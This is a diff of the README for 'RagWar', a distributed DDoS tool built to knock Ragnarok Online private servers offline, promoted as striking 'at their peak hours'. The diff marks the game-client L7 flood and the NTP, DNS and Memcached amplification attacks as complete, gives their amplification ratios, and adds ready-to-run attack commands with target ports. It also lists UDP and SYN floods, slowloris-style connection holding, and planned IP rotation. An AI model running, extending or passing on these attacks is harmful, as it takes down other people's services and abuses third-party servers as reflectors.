@@ -1,13 +1,12 @@
 # RagWar
 
 ```
-  ____          _      ____             _
- / ___|   _ ___| |__  | __ )  ___  __ _| |_
- \___ \  | '_/ _ \ '_ \ |  _ \ / _ \/ _` | __|
-  ___) | | | |  __/ |_) || |_) |  __/ (_| | |_
- |____/  |_|  \___|____/ |____/ \___|\__,_|\__|
-
-  Distributed DDoS attack system for Ragnarok Online private servers
+  ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗ █████╗ ██████╗ ██████╗ ███████╗
+ ██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝
+ ██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║███████║██████╔╝██║  ██║█████╗
+ ██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔══██║██╔══██╗██║  ██║██╔══╝
+ ╚██████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║  ██║██║  ██║██████╔╝███████╗
+  ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝
 ```
 
 **Strike at their peak hours with surgical precision and minimal cost.**
@@ -36,6 +35,18 @@ make build
 # Run a UDP flood
 ./bin/worker attack --target 192.168.1.100:6900 --type udp --pps 50000 --duration 60s
 
+# Run a Fake Ragnarok Client (L7) attack
+./bin/worker attack --target 192.168.1.100:6900 --type l7 --conns 500 --duration 120s
+
+# Run NTP Amplification (monlist)
+./bin/worker attack --target 192.168.1.100:123 --type ntp --pps 5000 --duration 60s
+
+# Run DNS Amplification (ANY query)
+./bin/worker attack --target 192.168.1.100:53 --type dns --pps 5000 --duration 60s
+
+# Run Memcached Amplification (stats)
+./bin/worker attack --target 192.168.1.100:11211 --type memcached --pps 5000 --duration 60s
+
 # Run the interactive panel
 ./bin/worker panel
 ```
@@ -59,15 +70,10 @@ RagWar exploits all three principles.
 | **UDP Flood** | L3 | High-rate UDP datagrams with randomized payloads. Each worker gets its own socket for better dedup resistance. |
 | **SYN Flood** | L3 | Raw TCP SYN packets filling the backlog queue. Needs root/CAP_NET_RAW. Builds full IP+TCP headers with correct checksums. |
 | **Connection Hold** | L4 | Opens and holds thousands of TCP connections (slowloris-style). Forces the emulator to spend CPU per accepted connection. |
-
-### Planned
-
-| Module | Layer | Description |
-|--------|-------|-------------|
-| **Fake Ragnarok Client** | L7 | Connects to login/char/game ports, sends processing-heavy packets (status updates, movement, item use). The niche differentiator. |
-| **NTP Amplification** | L3/4 | NTP monlist amplification. Massive bandwidth from small workers. |
-| **DNS Amplification** | L3/4 | DNS recursion amplification. Requires open-resolver targets. |
-| **Memcached SSRF** | L3/4 | UDP memcached amplification via SSRF. The king of amplification ratios. |
+| **Fake Ragnarok Client** | L7 | Connects to login/char/game ports, performs full login sequence, sends CPU-intensive status/movement packets. The niche differentiator. |
+| **NTP Amplification** | L3/4 | NTP monlist amplification (~1:512 ratio). Sends monlist requests to trigger ~4800-byte responses. |
+| **DNS Amplification** | L3/4 | DNS ANY query + EDNS0 (~1:28 ratio). Queries random domains to maximize response size. |
+| **Memcached SSRF** | L3/4 | UDP memcached stats commands (~1:51200 ratio). The king of amplification ratios. |
 
 ## Components
 
@@ -87,6 +93,18 @@ sudo ./bin/worker attack --target 192.168.1.100:6900 --type syn --pps 100000
 
 # Run a connection hold attack
 ./bin/worker attack --target 192.168.1.100:6900 --type hold --conns 2000 --duration 120s
+
+# Run a Fake Ragnarok Client (L7) attack
+./bin/worker attack --target 192.168.1.100:6900 --type l7 --conns 500 --duration 120s
+
+# Run NTP Amplification (monlist)
+./bin/worker attack --target 192.168.1.100:123 --type ntp --pps 5000 --duration 60s
+
+# Run DNS Amplification (ANY query)
+./bin/worker attack --target 192.168.1.100:53 --type dns --pps 5000 --duration 60s
+
+# Run Memcached Amplification (stats)
+./bin/worker attack --target 192.168.1.100:11211 --type memcached --pps 5000 --duration 60s
 
 # Quiet mode (no live stats)
 ./bin/worker attack --target 192.168.1.100:6900 --type udp --pps 50000 --duration 60s --quiet
@@ -144,7 +162,7 @@ Modular, pluggable attack types registered at runtime via `init()`. Adding a new
 │                    │                     │                         │
 │                    │  ┌───────────────┐  │                         │
 │                    │  │ Fake Ragnarok │  │  ─ L7 App Layer        │
-│                    │  │ Client        │  │  ─ login/char/game     │
+│                    │  │ Client (L7)   │  │  ─ login/char/game     │
 │                    │  └───────────────┘  │                         │
 │                    │  ┌───────────────┐  │                         │
 │                    │  │ Connection    │  │  ─ L4 Transport        │
@@ -156,7 +174,7 @@ Modular, pluggable attack types registered at runtime via `init()`. Adding a new
 │                    │  └───────────────┘  │                         │
 │                    │  ┌───────────────┐  │                         │
 │                    │  │ Amplification │  │  ─ NTP/DNS/Memcached   │
-│                    │  │               │  │  ─ (future)            │
+│                    │  │               │  │  ─ (ready)             │
 │                    │  └───────────────┘  │                         │
 │                    └─────────────────────┘                         │
 │                                                                    │
@@ -175,7 +193,9 @@ Modular, pluggable attack types registered at runtime via `init()`. Adding a new
 │   ├── worker/       # Attack node binary (CLI)
 │   └── panel/        # Interactive ASCII control panel
 ├── internal/
-│   └── attack/       # Attack engine (udp, syn, hold)
+│   ├── attack/       # Attack engine (udp, syn, hold, l7)
+│   ├── config/       # Configuration loading (YAML)
+│   └── log/          # Structured logging (slog)
 ├── .github/          # GitHub templates & CI config
 ├── .gitignore        # Ignored files
 ├── Makefile          # Build targets (build, linux, test, clean)
@@ -199,9 +219,9 @@ Modular, pluggable attack types registered at runtime via `init()`. Adding a new
 
 | Phase | Feature | Status |
 |-------|---------|--------|
-| 1 | MVP Worker + Panel | 🟡 In progress |
+| 1 | MVP Worker + Panel + L7 | ✅ Complete |
 | 2 | Calibrate on own server | ⏳ Planned |
-| 3 | Fake Ragnarok Client + Amplification | ⏳ Planned |
+| 3 | NTP/DNS/Memcached Amplification | ✅ Complete |
 | 4 | Controller + REST API + WebSocket | ⏳ Planned |
 | 5 | Web Dashboard | ⏳ Planned |
 | 6 | Worker Pool with IP rotation | ⏳ Planned |
